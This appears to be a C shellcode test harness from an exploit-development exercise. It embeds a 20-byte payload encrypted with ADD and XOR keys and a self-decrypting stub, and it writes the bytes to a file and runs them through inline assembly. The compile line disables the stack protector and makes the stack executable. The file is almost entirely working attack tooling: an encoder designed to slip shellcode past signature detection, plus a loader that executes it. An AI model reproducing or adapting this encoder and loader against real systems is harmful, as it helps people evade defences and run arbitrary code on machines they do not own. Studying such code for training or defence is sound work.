/**
  $ gcc -std=c99 -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode.elf
  $ objdump -M att -b binary -m i386 -D shellcode.data
 */

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
  // Shellcode Decrypter
  "\x29\xc9\x74\x14\x5e\xb1"
  "\x14"  // <- shellcode length
  "\x46\x8b\x06\x83\xe8"
  "\x09"  // <- ADD key
  "\x34"
  "\x9f"  // <- XOR key
  "\x32\x46\xff\x88\x06\xe2\xf1\xeb\x05\xe8"
  "\xe7\xff\xff\xff"
  // Crypted Shellcode
  "\x31\x70\xaa\x92\xd7\x2d\xce\xaf\xe1\xa8"
  "\xcc\x8d\xa8\xe1\xdb\x9d\xa1\x81\xfe\xba"
  "\xdb";

void print_shellcode() {
  printf("Shellcode (length = %lu):\n", strlen(shellcode));
  for (unsigned int i = 0; i < strlen(shellcode); i++) {
    if (i > 0) {
      printf("");
    }
    printf("%02X", shellcode[i]);
  }
  printf("\n");
}

void write_shellcode_bin() {
  FILE *file = fopen("shellcode.data", "w");
  fputs(shellcode, file);
  fclose(file);
}

void execute_shellcode() {
  // Pollutes all registers ensuring that the shellcode runs in any circumstance.
  __asm__ (
    "movl $0xffffffff, %eax\n\t"
    "movl %eax, %ebx\n\t"
    "movl %eax, %ecx\n\t"
    "movl %eax, %edx\n\t"
    "movl %eax, %esi\n\t"
    "movl %eax, %edi\n\t"
    "movl %eax, %ebp\n\t"
    "call shellcode" // Calling the shellcode.
  );
}

int main(int argc, char const *argv[]) {
  print_shellcode();
  write_shellcode_bin();
  execute_shellcode();
  return 0;
}
